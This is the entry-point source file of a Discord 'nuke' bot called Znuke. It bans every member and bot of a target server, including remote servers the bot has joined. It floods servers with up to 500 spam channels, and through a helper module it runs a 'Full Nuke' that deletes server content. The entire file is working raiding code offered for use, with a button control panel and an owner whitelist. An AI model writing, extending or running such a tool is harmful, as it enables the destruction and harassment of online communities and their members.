// src/index.js — Bot entry point
//
// Usage:
//   znuke                    → nuke current server (ban all members & bots)
//   znuke <server_id>        → nuke remote server  (ban all members & bots)
//   znuke manager            → open the interactive Znuke Manager embed

import 'dotenv/config';
import {
  Client,
  GatewayIntentBits,
  Events,
  Partials,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
} from 'discord.js';
import { nukeServer } from './commands/nuke.js';

// ─── Owner whitelist ───────────────────────────────────────────────────────────
const ALLOWED_IDS = new Set(
  (process.env.OWNER_IDS ?? '')
    .split(',')
    .map((id) => id.trim())
    .filter(Boolean),
);

const PREFIX = 'znuke';

// ─── Deduplication guard ───────────────────────────────────────────────────────
const handledMessages = new Set();

// ─── Client ───────────────────────────────────────────────────────────────────
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
  ],
  partials: [Partials.Channel],
});

// ─── Global error guard ────────────────────────────────────────────────────────
client.on('error', (err) => console.error('[client error]', err.message));
process.on('unhandledRejection', (err) => console.error('[unhandledRejection]', err?.message ?? err));

// ─── Helper: send a message safely (channel may be deleted after nuke) ─────────
async function safeSend(channel, user, payload) {
  try {
    await channel.send(payload);
  } catch {
    try {
      const dm = await user.createDM();
      await dm.send(payload);
    } catch (dmErr) {
      console.warn('[safeSend] Could not DM user either:', dmErr.message);
    }
  }
}

// ─── Helper: send the Znuke Manager embed ─────────────────────────────────────
async function sendManagerEmbed(channel) {
  const embed = new EmbedBuilder()
    .setColor(0x5865f2)
    .setTitle('☢️ Znuke Manager')
    .setDescription(
      [
        '> Control panel for advanced nuke operations.',
        '',
        '**Available Actions:**',
        '🔨 **Ban All** — Ban every member & bot in the server',
        '📣 **Create Channels** — Flood the server with spam channels',
        '☢️ **Full Nuke** — Delete everything + ban all + spam channels',
        '',
        '> Press a button below to begin.',
      ].join('\n'),
    )
    .setFooter({ text: 'Only authorised users can interact with this panel.' })
    .setTimestamp();

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId('manager_ban')
      .setLabel('🔨 Ban All')
      .setStyle(ButtonStyle.Danger),
    new ButtonBuilder()
      .setCustomId('manager_channels')
      .setLabel('📣 Create Channels')
      .setStyle(ButtonStyle.Primary),
    new ButtonBuilder()
      .setCustomId('manager_fullnuke')
      .setLabel('☢️ Full Nuke')
      .setStyle(ButtonStyle.Danger),
  );

  await channel.send({ embeds: [embed], components: [row] });
}

// ─── Ready ────────────────────────────────────────────────────────────────────
client.once(Events.ClientReady, (c) => {
  console.log(`\n✅  Logged in as ${c.user.tag}`);
  console.log(`📡  Watching ${c.guilds.cache.size} guild(s)`);
  console.log(`☢️   znuke command is active`);
  console.log(`👑  Authorised users: ${[...ALLOWED_IDS].join(', ') || 'NONE SET'}\n`);
});

// ─── Message handler ──────────────────────────────────────────────────────────
client.on(Events.MessageCreate, async (message) => {
  // Ignore bots
  if (message.author.bot) return;

  const content = message.content.trim();

  // Must start with "znuke" (case-insensitive)
  if (!content.toLowerCase().startsWith(PREFIX)) return;

  // ── Deduplication ─────────────────────────────────────────────────────────
  if (handledMessages.has(message.id)) return;
  handledMessages.add(message.id);
  setTimeout(() => handledMessages.delete(message.id), 60_000);

  // ── Authorisation check ───────────────────────────────────────────────────
  if (!ALLOWED_IDS.has(message.author.id)) {
    return message.reply({
      embeds: [
        new EmbedBuilder()
          .setColor(0xff3c3c)
          .setTitle('🚫 Access Denied')
          .setDescription('You are **not authorised** to use this command.')
          .setTimestamp(),
      ],
    }).catch(() => {});
  }

  // ── Parse arguments ───────────────────────────────────────────────────────
  const args        = content.slice(PREFIX.length).trim().split(/\s+/).filter(Boolean);
  const isManager   = args[0]?.toLowerCase() === 'manager';
  const serverIdArg = isManager ? args[1] : args.find((a) => a.toLowerCase() !== 'ban');
  const targetId    = serverIdArg ?? message.guild?.id;

  // ── znuke manager ─────────────────────────────────────────────────────────
  if (isManager) {
    return sendManagerEmbed(message.channel).catch(() => {});
  }

  if (!targetId) {
    return message.reply(
      '❌ Provide a server ID when using this in DMs.\n`znuke <server_id>`',
    ).catch(() => {});
  }

  // ── Fetch target guild ────────────────────────────────────────────────────
  let targetGuild;
  try {
    targetGuild = await client.guilds.fetch(targetId);
  } catch {
    return message.reply(
      `❌ Cannot reach server \`${targetId}\`.\nThe bot must be a member of that server.`,
    ).catch(() => {});
  }

  const isRemote = targetId !== message.guild?.id;

  // ── Snapshot the channel & user BEFORE nuking ─────────────────────────────
  const reportChannel = message.channel;
  const invoker       = message.author;

  // ── Confirmation prompt ───────────────────────────────────────────────────
  await message.reply({
    embeds: [
      new EmbedBuilder()
        .setColor(0xff3c3c)
        .setTitle('⚠️ Confirm Nuke')
        .setDescription(
          [
            `**Target:** ${targetGuild.name} (\`${targetGuild.id}\`)`,
            `**Action:** 🔨 Ban All (members + bots)`,
            isRemote ? '> 🌐 **Remote nuke**' : '> 🏠 **Local nuke**',
            '',
            'Type **`confirm`** within 30 seconds to proceed.',
          ].join('\n'),
        )
        .setTimestamp(),
    ],
  }).catch(() => {});

  // ── Wait for "confirm" ────────────────────────────────────────────────────
  const filter = (m) =>
    m.author.id === invoker.id && m.content.toLowerCase() === 'confirm';

  try {
    await message.channel.awaitMessages({ filter, max: 1, time: 30_000, errors: ['time'] });
  } catch {
    return message.channel.send('✅ Nuke cancelled — timed out. No action taken.').catch(() => {});
  }

  // ── Begin nuke ────────────────────────────────────────────────────────────
  await safeSend(reportChannel, invoker, {
    embeds: [
      new EmbedBuilder()
        .setColor(0xff3c3c)
        .setTitle('☢️ Nuke In Progress…')
        .setDescription(`🔴 Wiping **${targetGuild.name}**…`)
        .setTimestamp(),
    ],
  });

  try {
    const log = await nukeServer(targetGuild, client.user.id);

    await safeSend(reportChannel, invoker, {
      embeds: [
        new EmbedBuilder()
          .setColor(0x2b2d31)
          .setTitle('💀 Nuke Complete')
          .setDescription(log.join('\n'))
          .setFooter({ text: `${targetGuild.name} (${targetGuild.id})` })
          .setTimestamp(),
      ],
    });
  } catch (err) {
    console.error('[znuke] Unexpected error:', err.message);
    await safeSend(reportChannel, invoker, `❌ Nuke error: \`${err.message}\``);
  }
});

// ─── Button / Modal interaction handler ───────────────────────────────────────
client.on(Events.InteractionCreate, async (interaction) => {
  // ── Auth check for all interactions ───────────────────────────────────────
  if (!ALLOWED_IDS.has(interaction.user.id)) {
    return interaction.reply({
      embeds: [
        new EmbedBuilder()
          .setColor(0xff3c3c)
          .setTitle('🚫 Access Denied')
          .setDescription('You are **not authorised** to use this.'),
      ],
      ephemeral: true,
    }).catch(() => {});
  }

  const guild = interaction.guild;
  if (!guild) {
    return interaction.reply({ content: '❌ Must be used inside a server.', ephemeral: true }).catch(() => {});
  }

  // ─────────────────────────────────────────────────────────────────────────
  // BUTTON: Ban All
  // ─────────────────────────────────────────────────────────────────────────
  if (interaction.isButton() && interaction.customId === 'manager_ban') {
    // Show confirmation modal
    const modal = new ModalBuilder()
      .setCustomId('modal_ban')
      .setTitle('Ban All Members & Bots');

    modal.addComponents(
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('ban_confirm')
          .setLabel('Type CONFIRM to proceed')
          .setStyle(TextInputStyle.Short)
          .setPlaceholder('CONFIRM')
          .setRequired(true),
      ),
    );

    return interaction.showModal(modal).catch(() => {});
  }

  // ─────────────────────────────────────────────────────────────────────────
  // BUTTON: Create Channels
  // ─────────────────────────────────────────────────────────────────────────
  if (interaction.isButton() && interaction.customId === 'manager_channels') {
    const modal = new ModalBuilder()
      .setCustomId('modal_channels')
      .setTitle('Create Spam Channels');

    modal.addComponents(
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('channels_count')
          .setLabel('Channels to Create (0–500)')
          .setStyle(TextInputStyle.Short)
          .setPlaceholder('10')
          .setRequired(true),
      ),
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('channels_name')
          .setLabel('Channel Name')
          .setStyle(TextInputStyle.Short)
          .setPlaceholder('nuked-by-prince')
          .setRequired(true),
      ),
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('channels_confirm')
          .setLabel('Type CONFIRM to proceed')
          .setStyle(TextInputStyle.Short)
          .setPlaceholder('CONFIRM')
          .setRequired(true),
      ),
    );

    return interaction.showModal(modal).catch(() => {});
  }

  // ─────────────────────────────────────────────────────────────────────────
  // BUTTON: Full Nuke
  // ─────────────────────────────────────────────────────────────────────────
  if (interaction.isButton() && interaction.customId === 'manager_fullnuke') {
    const modal = new ModalBuilder()
      .setCustomId('modal_fullnuke')
      .setTitle('☢️ Full Nuke');

    modal.addComponents(
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('fullnuke_channels_count')
          .setLabel('Channels to Create (0–500)')
          .setStyle(TextInputStyle.Short)
          .setPlaceholder('10')
          .setRequired(true),
      ),
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('fullnuke_channel_name')
          .setLabel('Channel Name')
          .setStyle(TextInputStyle.Short)
          .setPlaceholder('nuked-by-prince')
          .setRequired(true),
      ),
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('fullnuke_confirm')
          .setLabel('Type CONFIRM to proceed')
          .setStyle(TextInputStyle.Short)
          .setPlaceholder('CONFIRM')
          .setRequired(true),
      ),
    );

    return interaction.showModal(modal).catch(() => {});
  }

  // ─────────────────────────────────────────────────────────────────────────
  // MODAL SUBMIT: Ban All
  // ─────────────────────────────────────────────────────────────────────────
  if (interaction.isModalSubmit() && interaction.customId === 'modal_ban') {
    const confirm = interaction.fields.getTextInputValue('ban_confirm').trim().toUpperCase();
    if (confirm !== 'CONFIRM') {
      return interaction.reply({ content: '❌ Cancelled — you did not type CONFIRM.', ephemeral: true }).catch(() => {});
    }

    await interaction.reply({
      embeds: [
        new EmbedBuilder()
          .setColor(0xff3c3c)
          .setTitle('🔨 Ban In Progress…')
          .setDescription(`Banning all members & bots from **${guild.name}**…`)
          .setTimestamp(),
      ],
      ephemeral: true,
    }).catch(() => {});

    try {
      await guild.members.fetch();
      const members = guild.members.cache.filter((m) => m.id !== client.user.id);
      await Promise.allSettled(members.map((m) => m.ban({ reason: 'Znuke Manager — Ban All' }).catch(() => {})));

      await interaction.followUp({
        embeds: [
          new EmbedBuilder()
            .setColor(0x2b2d31)
            .setTitle('💀 Ban Complete')
            .setDescription(`Banned \`${members.size}\` members (including bots).`)
            .setTimestamp(),
        ],
        ephemeral: true,
      }).catch(() => {});
    } catch (err) {
      await interaction.followUp({ content: `❌ Error: \`${err.message}\``, ephemeral: true }).catch(() => {});
    }
    return;
  }

  // ─────────────────────────────────────────────────────────────────────────
  // MODAL SUBMIT: Create Channels
  // ─────────────────────────────────────────────────────────────────────────
  if (interaction.isModalSubmit() && interaction.customId === 'modal_channels') {
    const confirm = interaction.fields.getTextInputValue('channels_confirm').trim().toUpperCase();
    if (confirm !== 'CONFIRM') {
      return interaction.reply({ content: '❌ Cancelled — you did not type CONFIRM.', ephemeral: true }).catch(() => {});
    }

    const rawCount   = interaction.fields.getTextInputValue('channels_count').trim();
    const channelName = interaction.fields.getTextInputValue('channels_name').trim() || 'nuked';
    const count      = Math.min(Math.max(parseInt(rawCount, 10) || 0, 0), 500);

    await interaction.reply({
      embeds: [
        new EmbedBuilder()
          .setColor(0x5865f2)
          .setTitle('📣 Creating Channels…')
          .setDescription(`Creating **${count}** channels named \`${channelName}\`…`)
          .setTimestamp(),
      ],
      ephemeral: true,
    }).catch(() => {});

    try {
      const tasks = Array.from({ length: count }, () =>
        guild.channels.create({ name: channelName }).catch(() => {}),
      );
      const results = await Promise.allSettled(tasks);
      const succeeded = results.filter((r) => r.status === 'fulfilled').length;

      await interaction.followUp({
        embeds: [
          new EmbedBuilder()
            .setColor(0x2b2d31)
            .setTitle('✅ Channels Created')
            .setDescription(`Created \`${succeeded}\` channels named \`${channelName}\`.`)
            .setTimestamp(),
        ],
        ephemeral: true,
      }).catch(() => {});
    } catch (err) {
      await interaction.followUp({ content: `❌ Error: \`${err.message}\``, ephemeral: true }).catch(() => {});
    }
    return;
  }

  // ─────────────────────────────────────────────────────────────────────────
  // MODAL SUBMIT: Full Nuke
  // ─────────────────────────────────────────────────────────────────────────
  if (interaction.isModalSubmit() && interaction.customId === 'modal_fullnuke') {
    const confirm = interaction.fields.getTextInputValue('fullnuke_confirm').trim().toUpperCase();
    if (confirm !== 'CONFIRM') {
      return interaction.reply({ content: '❌ Cancelled — you did not type CONFIRM.', ephemeral: true }).catch(() => {});
    }

    const rawCount    = interaction.fields.getTextInputValue('fullnuke_channels_count').trim();
    const channelName = interaction.fields.getTextInputValue('fullnuke_channel_name').trim() || 'nuked';
    const count       = Math.min(Math.max(parseInt(rawCount, 10) || 0, 0), 500);

    await interaction.reply({
      embeds: [
        new EmbedBuilder()
          .setColor(0xff3c3c)
          .setTitle('☢️ Full Nuke In Progress…')
          .setDescription(`🔴 Wiping **${guild.name}**…`)
          .setTimestamp(),
      ],
      ephemeral: true,
    }).catch(() => {});

    try {
      const log = await nukeServer(guild, client.user.id, count, channelName);

      await interaction.followUp({
        embeds: [
          new EmbedBuilder()
            .setColor(0x2b2d31)
            .setTitle('💀 Full Nuke Complete')
            .setDescription(log.join('\n'))
            .setFooter({ text: `${guild.name} (${guild.id})` })
            .setTimestamp(),
        ],
        ephemeral: true,
      }).catch(() => {});
    } catch (err) {
      console.error('[manager full nuke] Error:', err.message);
      await interaction.followUp({ content: `❌ Nuke error: \`${err.message}\``, ephemeral: true }).catch(() => {});
    }
    return;
  }
});

// ─── Login ────────────────────────────────────────────────────────────────────
client.login(process.env.BOT_TOKEN);
